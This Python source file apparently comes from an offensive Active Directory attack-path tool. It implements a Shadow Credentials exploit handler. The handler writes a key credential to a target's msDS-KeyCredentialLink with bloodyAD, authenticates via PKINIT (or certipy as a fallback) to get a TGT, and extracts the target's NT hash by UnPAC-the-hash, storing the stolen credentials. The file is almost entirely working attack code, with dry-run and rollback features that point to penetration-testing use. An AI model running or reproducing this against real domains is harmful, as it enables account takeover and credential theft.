"""Shadow Credentials (AddKeyCredentialLink) exploitation handler.

Exploits the ``AddKeyCredentialLink`` BloodHound edge by performing a
Shadow Credentials attack:

1. Add a Key Credential to the target's ``msDS-KeyCredentialLink`` using bloodyAD.
2. Authenticate with the generated certificate to obtain a TGT via PKINIT.
3. Perform UnPAC-the-hash (U2U) to recover the target's NT hash.

Rollback removes the added Key Credential from the target by device ID.
"""

from __future__ import annotations

import shutil
from datetime import datetime, timezone

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools.bloodyad_wrapper import add_key_credential, run_bloodyad
from pathstrike.tools.certipy_wrapper import certipy_auth


@register_handler("AddKeyCredentialLink")
class ShadowCredsHandler(BaseEdgeHandler):
    """Exploit ``AddKeyCredentialLink`` via the Shadow Credentials attack.

    Attack flow:
        1. Use bloodyAD to add a Key Credential to the target's
           ``msDS-KeyCredentialLink`` attribute.  bloodyAD generates a
           self-signed certificate and returns the PFX path and device ID.
        2. Authenticate with the generated PFX certificate via certipy auth
           (PKINIT) to obtain a TGT for the target principal.
        3. certipy auth's UnPAC-the-hash step extracts the target's NT hash
           from the PAC in the TGT.

    Rollback:
        Remove the specific Key Credential entry from ``msDS-KeyCredentialLink``
        using the device ID captured during step 1.
    """

    # Stored after successful exploitation for rollback
    _device_id: str | None = None

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify that bloodyAD and certipy are available, and that we hold
        valid credentials for the source principal.

        Args:
            edge: The ``AddKeyCredentialLink`` edge to evaluate.

        Returns:
            ``(ok, message)`` tuple.
        """
        # Check bloodyAD availability
        if not shutil.which("bloodyAD"):
            return (
                False,
                "bloodyAD binary not found on PATH. "
                "Install via: pip install bloodyAD",
            )

        # Check certipy availability (needed for PKINIT auth)
        if not shutil.which("certipy"):
            return (
                False,
                "certipy binary not found on PATH. "
                "Install via: pip install certipy-ad",
            )

        # Verify we have credentials for the source principal
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)

        if cred is None:
            # Fall back to config-level credentials
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for source principal '{source_user}'. "
                    "Cannot authenticate to modify msDS-KeyCredentialLink.",
                )

        # Verify the target is a User or Computer (key credentials apply to both)
        target_label = edge.target.label.lower()
        if target_label not in ("user", "computer"):
            return (
                False,
                f"Target node type '{edge.target.label}' is not a User or Computer. "
                "Shadow Credentials only applies to security principals with "
                "msDS-KeyCredentialLink.",
            )

        target_user = self._shadow_target_identity(edge)
        self.logger.info(
            "Prerequisites met: can write msDS-KeyCredentialLink on '%s' as '%s'",
            target_user,
            source_user,
        )
        return (True, f"Ready to add shadow credential to {target_user}")

    def _shadow_target_identity(self, edge: EdgeInfo) -> str:
        """Resolve the target to a sAMAccountName bloodyAD/certipy can look up.

        BloodHound names computers by FQDN (``CASTELBLACK.NORTH...``), but
        bloodyAD's ``add shadowCredentials`` resolves the argument via
        ``(sAMAccountName=<arg>)`` — and a computer's sAMAccountName is the
        short host name with a trailing ``$`` (``CASTELBLACK$``).  Passing the
        FQDN yields ``NoResultError``.  Users already carry a bare
        sAMAccountName, so they pass through unchanged.
        """
        name = self._resolve_target(edge)  # strips any @domain suffix
        if edge.target.label.lower() == "computer":
            short = name.split(".")[0]
            return short if short.endswith("$") else f"{short}$"
        return name

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        """Execute the Shadow Credentials attack chain.

        Args:
            edge: The ``AddKeyCredentialLink`` edge.
            dry_run: If ``True``, log the planned actions without executing them.

        Returns:
            ``(success, message, new_credentials)`` tuple.
        """
        target_user = self._shadow_target_identity(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        # Authenticate as the edge's source principal (the holder of the
        # AddKeyCredentialLink right) — NOT the config foothold user, which
        # generally lacks write access to msDS-KeyCredentialLink.
        auth_args = self._get_auth_args(self._resolve_principal(edge))

        new_creds: list[Credential] = []

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would add Key Credential to '{target_user}', "
                f"then authenticate via PKINIT to recover NT hash.",
                [],
            )

        # ---- Step 1: Add Key Credential via bloodyAD ----
        self.logger.info(
            "Step 1/3: Adding Key Credential to '%s' via bloodyAD",
            target_user,
        )
        kc_result = await add_key_credential(
            self.config,
            auth_args,
            target_user,
        )

        if not kc_result["success"]:
            return (
                False,
                f"Failed to add Key Credential to '{target_user}': "
                f"{kc_result.get('error', 'unknown error')}",
                [],
            )

        # bloodyAD's `add shadowCredentials` performs the COMPLETE shadow-
        # credential flow itself whenever the DC supports PKINIT: it generates
        # the certificate, writes msDS-KeyCredentialLink, authenticates via
        # PKINIT, stores a TGT ccache, and UnPACs the NT hash — all in one
        # invocation.  Its stdout looks like::
        #
        #     [+] KeyCredential generated with following sha256 of RSA key: <sha>
        #     [+] TGT stored in ccache file <path>.ccache
        #     NT: <nthash>
        #
        # Only when PKINIT is unavailable does bloodyAD instead drop a PFX
        # (per `--path`: "TGT ccache or pfx if PKINIT fails"), which we then
        # authenticate with via certipy as a fallback.  The original code
        # always expected the PFX path and bailed otherwise, so a DC that
        # *does* support PKINIT (the common case) looked like a failure.
        device_id = self._extract_device_id(kc_result)
        if device_id:
            self._device_id = device_id
            self.logger.info("Captured device ID for rollback: %s", device_id)
        else:
            self.logger.warning(
                "Could not extract a device ID from bloodyAD output; rollback "
                "will remove all key credentials on the target."
            )

        nt_hash = self._extract_nt_hash(kc_result)
        ccache_path = self._extract_ccache_path(kc_result)

        # ---- Path A: bloodyAD already completed PKINIT (TGT [+ NT hash]) ----
        if nt_hash or ccache_path:
            self.logger.info(
                "bloodyAD completed PKINIT for '%s'%s",
                target_user,
                " and UnPAC'd the NT hash" if nt_hash else "",
            )
            new_creds.extend(
                self._record_shadow_creds(
                    target_user, domain, nt_hash=nt_hash, ccache_path=ccache_path
                )
            )
            return (
                True,
                self._shadow_success_message(
                    target_user, nt_hash, ccache_path, device_id
                ),
                new_creds,
            )

        # ---- Path B: PKINIT unavailable — bloodyAD dropped a PFX ----
        pfx_path = self._extract_pfx_path(kc_result)
        if not pfx_path:
            return (
                False,
                "bloodyAD add shadowCredentials produced neither a TGT/NT hash "
                "(PKINIT) nor a PFX certificate; cannot complete Shadow "
                "Credentials. The Key Credential may have been written and "
                "should be rolled back.",
                new_creds,
            )

        cert_cred = Credential(
            cred_type=CredentialType.certificate,
            value=pfx_path,
            username=target_user,
            domain=domain,
            obtained_from=f"shadow_creds:{edge.source.name}->msDS-KeyCredentialLink",
            obtained_at=datetime.now(timezone.utc),
        )
        new_creds.append(cert_cred)
        self.cred_store.add_credential(cert_cred)

        self.logger.info(
            "bloodyAD emitted a PFX (PKINIT not done in-tool); authenticating "
            "as '%s' via certipy with %s",
            target_user,
            pfx_path,
        )
        auth_result = await certipy_auth(
            pfx_path=pfx_path,
            dc_ip=dc_host,
            domain=domain,
        )

        if not auth_result["success"]:
            return (
                False,
                f"PKINIT authentication failed for '{target_user}': "
                f"{auth_result.get('error', 'unknown error')}. "
                "The Key Credential was added successfully and should be rolled back.",
                new_creds,
            )

        parsed = auth_result.get("parsed") or {}
        new_creds.extend(
            self._record_shadow_creds(
                target_user,
                domain,
                nt_hash=parsed.get("nt_hash"),
                ccache_path=parsed.get("ccache_path"),
            )
        )
        return (
            True,
            self._shadow_success_message(
                target_user,
                parsed.get("nt_hash"),
                parsed.get("ccache_path"),
                device_id,
            ),
            new_creds,
        )

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """Return a rollback action to remove the shadow credential.

        The rollback command removes the Key Credential entry from the target's
        ``msDS-KeyCredentialLink`` attribute using the device ID captured during
        exploitation.

        Args:
            edge: The ``AddKeyCredentialLink`` edge.

        Returns:
            A :class:`RollbackAction` that removes the key credential, or
            ``None`` if no device ID was captured.
        """
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()

        # Rollback commands omit --host/-d/--dc-ip — the RollbackManager
        # injects connection and auth args automatically for bloodyAD commands.
        if self._device_id:
            # bloodyAD remove shadowCredentials uses --key to identify the
            # specific Key Credential entry to remove.
            command = (
                f"bloodyAD remove shadowCredentials {target_user} "
                f"--key {self._device_id}"
            )
            description = (
                f"Remove shadow credential (key {self._device_id}) "
                f"from {target_user}"
            )
        else:
            # Fallback: remove the most recent key credential
            command = (
                f"bloodyAD remove shadowCredentials {target_user}"
            )
            description = (
                f"Remove shadow credential from {target_user} "
                "(no device ID captured; may remove wrong entry)"
            )

        return RollbackAction(
            step_index=0,  # Will be overridden by the orchestrator
            action_type="remove_key_credential",
            description=description,
            command=command,
            reversible=True,
        )

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_device_id(result: dict) -> str | None:
        """Extract the device ID from bloodyAD add keyCredentialLink output.

        bloodyAD may return the device ID in JSON parsed output or embed it
        in the raw text output.
        """
        # Try parsed JSON first
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            for key in ("DeviceID", "deviceId", "device_id", "DeviceId"):
                if key in parsed:
                    return str(parsed[key])

        # Fall back to regex on raw output
        import re

        output = result.get("output", "")
        # Common bloodyAD output patterns for device ID
        match = re.search(
            r"(?:Device\s*ID|deviceId|DeviceID)\s*[:=]\s*([a-fA-F0-9-]+)",
            output,
            re.IGNORECASE,
        )
        if match:
            return match.group(1)

        return None

    @staticmethod
    def _extract_pfx_path(result: dict) -> str | None:
        """Extract the PFX certificate path from bloodyAD output.

        bloodyAD generates a PFX file when adding a key credential and
        reports the path in its output.
        """
        # Try parsed JSON first
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            for key in ("pfx_path", "certificate", "cert_path", "PFXPath"):
                if key in parsed:
                    return str(parsed[key])

        # Fall back to regex on raw output
        import re

        output = result.get("output", "")
        # Look for PFX file path references
        match = re.search(r"([^\s'\"]+\.pfx)", output, re.IGNORECASE)
        if match:
            return match.group(1)

        # Also try PEM
        match = re.search(r"([^\s'\"]+\.pem)", output, re.IGNORECASE)
        if match:
            return match.group(1)

        return None

    @staticmethod
    def _extract_nt_hash(result: dict) -> str | None:
        """Extract the UnPAC'd NT hash from bloodyAD shadowCredentials output.

        bloodyAD prints the recovered hash on its own line as ``NT: <32 hex>``
        after a successful PKINIT + UnPAC-the-hash.  We also accept an
        ``LM:NT`` pair (impacket-style) and any ``nt_hash`` carried in parsed
        JSON, for robustness across tool versions.
        """
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            for key in ("nt_hash", "ntHash", "NT", "nthash"):
                if parsed.get(key):
                    return str(parsed[key]).lower()

        import re

        output = f"{result.get('output', '')}\n{result.get('stderr', '')}"
        # bloodyAD: "NT: <32 hex>"
        match = re.search(r"\bNT:\s*([0-9a-fA-F]{32})\b", output)
        if match:
            return match.group(1).lower()
        # Fallback: an LM:NT pair — keep the NT half.
        match = re.search(r"\b[0-9a-fA-F]{32}:([0-9a-fA-F]{32})\b", output)
        if match:
            return match.group(1).lower()

        return None

    @staticmethod
    def _extract_ccache_path(result: dict) -> str | None:
        """Extract the TGT ccache path from bloodyAD/certipy output.

        bloodyAD prints ``TGT stored in ccache file <path>`` when PKINIT
        succeeds.  Relative paths are resolved against the current working
        directory (where the tool wrote the file), matching how other
        handlers record ccache credentials.
        """
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            for key in ("ccache_path", "ccache", "ccachePath"):
                if parsed.get(key):
                    return str(parsed[key])

        import os
        import re

        output = f"{result.get('output', '')}\n{result.get('stderr', '')}"
        match = re.search(r"ccache file\s+(\S+\.ccache)", output, re.IGNORECASE)
        if not match:
            match = re.search(r"(\S+\.ccache)", output)
        if match:
            path = match.group(1)
            return path if os.path.isabs(path) else os.path.abspath(path)

        return None

    def _record_shadow_creds(
        self,
        target_user: str,
        domain: str,
        *,
        nt_hash: str | None,
        ccache_path: str | None,
    ) -> list[Credential]:
        """Store any recovered TGT/NT-hash in the credential store.

        Returns the list of :class:`Credential` objects created so the caller
        can append them to the edge result.  Shared by the bloodyAD-PKINIT
        path and the certipy-PFX fallback.
        """
        creds: list[Credential] = []

        if ccache_path:
            ccache_cred = Credential(
                cred_type=CredentialType.ccache,
                value=ccache_path,
                username=target_user,
                domain=domain,
                obtained_from="shadow_creds:pkinit_auth",
                obtained_at=datetime.now(timezone.utc),
            )
            creds.append(ccache_cred)
            self.cred_store.add_credential(ccache_cred)
            self.logger.info("Stored TGT ccache: %s", ccache_path)

        if nt_hash:
            hash_cred = Credential(
                cred_type=CredentialType.nt_hash,
                value=nt_hash,
                username=target_user,
                domain=domain,
                obtained_from="shadow_creds:unpac_the_hash",
                obtained_at=datetime.now(timezone.utc),
            )
            creds.append(hash_cred)
            self.cred_store.add_credential(hash_cred)
            self.logger.info(
                "Recovered NT hash for '%s': %s...%s",
                target_user,
                nt_hash[:4],
                nt_hash[-4:],
            )

        return creds

    @staticmethod
    def _shadow_success_message(
        target_user: str,
        nt_hash: str | None,
        ccache_path: str | None,
        device_id: str | None,
    ) -> str:
        """Build the human-readable success message for a shadow-creds win."""
        parts = [f"Shadow Credentials attack succeeded against '{target_user}'."]
        if nt_hash:
            parts.append(f"NT hash recovered: {nt_hash[:4]}...{nt_hash[-4:]}")
        if ccache_path:
            parts.append(f"TGT saved to: {ccache_path}")
        if device_id:
            parts.append(f"Device ID (for rollback): {device_id}")
        return " | ".join(parts)
